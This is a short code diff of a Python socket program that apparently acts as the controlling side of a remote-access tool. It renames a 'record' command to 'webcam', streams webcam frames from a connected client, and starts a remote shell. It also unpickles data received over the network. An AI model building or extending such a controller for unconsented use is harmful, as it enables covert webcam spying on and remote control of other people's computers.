@@ -7,9 +7,14 @@ import pickle
 import struct
 import imutils
 
+# Intended to read any buffer size soon
 BUFFER_SIZE = 1024 * 128
 
-class VideoStream:
+# Still not very stable, need a way to stop
+# that thing and handle exceptions in case client
+# SIGINTs
+
+class WebcamStream:
 	def __init__(self, client_socket):
 		self.client_socket = client_socket
 
@@ -18,7 +23,6 @@ class VideoStream:
 		data = b""
 		payload_size = struct.calcsize("Q")
 		while True:
-			print("Decoding...")
 			while len(data) < payload_size:
 				packet = self.client_socket.recv(4 * 1024)
 				if not packet:
@@ -32,7 +36,6 @@ class VideoStream:
 			frame_data = data[:msg_size]
 			data = data[msg_size:]
 			frame = pickle.loads(frame_data)
-			print("Printing screen")
 			cv2.imshow('Sender', frame)
 			key = cv2.waitKey(10)
 			if key == 13:
@@ -75,10 +78,10 @@ def main_loop(client_socket):
 			# client_socket.send(cmd.encode())
 			shell = Shell(client_socket)
 			shell.start()
-		elif cmd.split()[0] == "record":
+		elif cmd.split()[0] == "webcam":
 			client_socket.send(cmd.encode())
-			stream = VideoStream(client_socket)
-			stream.receive()
+			webcam = WebcamStream(client_socket)
+			webcam.receive()
 		elif cmd == "exit":
 			return
 
